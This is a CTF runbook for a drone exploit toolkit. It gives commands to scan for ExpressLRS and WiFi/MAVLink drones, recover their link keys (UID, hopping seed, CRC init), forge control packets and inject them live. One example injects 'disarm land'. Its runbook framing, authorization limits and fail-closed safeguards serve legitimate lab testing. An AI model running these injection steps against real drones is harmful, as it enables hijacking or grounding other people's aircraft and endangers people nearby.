# CTF Attack Flow Runbook — detect → identify → exploit

**Scope / authorization (read first):** This runbook drives the POCs in
`tools/exploit_chains/` against **hardware/networks you own and have isolated**
for a CTF. Every live stage is **fail-closed by default** — nothing transmits or
connects unless you pass `--arm`, and `--dry-run` always wins over `--arm`. The
E8 / TinyHawk **no-flash / no-open** rule is absolute. Running a live stage is
**your** action, under **your** sign-off, on **your** isolated rig; this doc
sets up and documents the gate, it does not arm anything.

Verified on the enclave (2026-11-02), all offline:
- `chain1-dry-run.py` — 6/6 stages PASS, 28/28 forged packets pass RX-side CRC.
- `cross_chain_orchestrator.py recon` / `rf-only` — PASS (degraded where no SDR).
- `test_cross_chain_arm_gate` — 5/5 OK (the `--arm` gate is regression-locked).
- `test_chain2_sitl_e2e` — 20/20 OK in simulation.

The three phases map onto the existing orchestrator:
- **DETECT**    → `recon` (rf_scan + wifi_scan)
- **IDENTIFY**  → `recon` + `rf-only` config_extract / crypto_derive (UID, FHSS
                  seed, CRC init, rate, PHY)
- **EXPLOIT**   → `rf-only` / `full` forge + preview (dry) → inject (armed, live)

---

## 0. Get the code + verify the gate (do this first, on your CTF box)

```bash
cd <clone>
git fetch origin && git reset --hard origin/main     # -> latest (has the POCs)
# prove the fail-closed gate is intact before touching anything:
python3 -m unittest tools.tests.test_cross_chain_arm_gate -v
```
Expect `Ran 5 tests ... OK`. If that's not green, stop — don't proceed.

> Run everything from `tools/exploit_chains/` or set
> `PYTHONPATH=tools/exploit_chains:tools` so the `elrs_core` / `mavlink_chain`
> imports resolve. All commands below assume `cd tools/exploit_chains`.

---

## 1. DETECT — "is a target here?"

**Sim/dry (anywhere, no hardware):**
```bash
python3 cross_chain_orchestrator.py recon --dry-run
```
**Live (your isolated rig, SDR + WiFi iface present):** still preview unless armed:
```bash
python3 cross_chain_orchestrator.py recon \
  --sdr-args driver=uhd --scan-time 10 --interface wlan0
```
`recon` runs `rf_scan` (SoapySDR/ELRS) + `wifi_scan` (drone APs). Without an SDR
it degrades gracefully (rf_scan SKIP) — that's expected, not a failure.

## 2. IDENTIFY — "what is it, and what are its air keys?"

```bash
python3 cross_chain_orchestrator.py rf-only --phrase "<binding-phrase>" --json
```
(Use `--phrase` when you already know it; otherwise the live `rf_scan` recovers
it.) Output gives you the air-identity the exploit depends on:
- **ELRS UID** (the 6-byte identity — note: this is the *pairing* UID, not a
  hardware-unique ID; see `HARDWARE-IDENTITY.md` for the HW-unique work).
- **FHSS seed**, **CRC init**, **sync channel/frequency**, **rate/PHY**.
- For the WiFi/MAVLink target: `recon`/`wifi-only` identify SSID + service.

`--json` gives the machine-readable shared state; `--state-out state.json` saves
it so the exploit stage can pick it up.

## 3. EXPLOIT — stage A: forge + preview (DRY, no transmission)

**This is the default and the safe "test it" path. Nothing goes on the air.**
```bash
# Full ELRS chain, offline, sim data:
python3 chain1-dry-run.py --phrase "<phrase>"            # 6/6 stages, CRC self-test
# Or via the orchestrator (detect→identify→forge→preview in one):
python3 cross_chain_orchestrator.py rf-only --phrase "<phrase>"
```
The `rf_preview` stage prints **`[DRY-RUN] Would: <packet> freq=...`** and
**`✓ RF preview complete (no transmission)`**. Confirm you see "no transmission"
before considering any live step. The forged packets (SYNC + RC + MSP) are
CRC-validated against the RX-side check, so a PASS here means they're well-formed
for the target's receiver.

## 4. EXPLOIT — stage B: LIVE injection (your action, your sign-off, isolated rig)

**Do not run this unless:** (a) the target is your own isolated hardware, (b)
props are off / it's a bench or sim, (c) you have a separately-approved bench
plan, (d) no other people's devices are in range. The gate requires `--arm`;
`--dry-run` always overrides it.

```bash
# ELRS RF inject (live): add --arm to the rf-only / full pipeline.
python3 cross_chain_orchestrator.py rf-only --phrase "<phrase>" --arm
# WiFi→MAVLink inject (live, e.g. Tello/MAVLink target):
python3 cross_chain_orchestrator.py wifi-only --ssid "<SSID>" --target-ip <ip> --arm
# Specific commands (default: disarm land):
python3 cross_chain_orchestrator.py full --commands disarm land --arm
```
Safety properties that hold (locked by `test_cross_chain_arm_gate`):
- Bare `... full` with **no** `--arm` → **preview only**, never live.
- `--dry-run` + `--arm` → **dry-run wins** (preview).
- Live inject stages report **`ATTEMPTED`** (commands sent), not a false
  `SUCCESS` — a live success claim requires the receiver to actually accept it
  (that's the `RECEIVER-ACCEPTED` evidence class, a separate bench proof).

**Positive-control note:** if the CTF goal is a *benign, observable* effect
(e.g. a known command the target logs), prefer the smallest such command and
confirm the effect on the target's own telemetry/log rather than a disruptive
one. That's both safer and cleaner evidence.

---

## Quick "test them later today" checklist
1. `git reset --hard origin/main` (latest POCs).
2. `python3 -m unittest tools.tests.test_cross_chain_arm_gate -v` → **OK**.
3. `python3 chain1-dry-run.py` → **PASS, 28/28 CRC**.
4. `python3 cross_chain_orchestrator.py recon --dry-run` → **PASS (degraded ok)**.
5. On your isolated rig: run stage 3 (preview) → confirm "no transmission" →
   then, **only if authorized + isolated + props off**, stage 4 with `--arm`.

## Out of scope (do NOT do in this CTF)
- Live RF/WiFi against anything you don't own and haven't isolated.
- Flashing or opening the E8 / TinyHawk (absolute no).
- Turning the `--arm` gate off, or defaulting any path to live.
- New offensive capability aimed at non-owned targets.
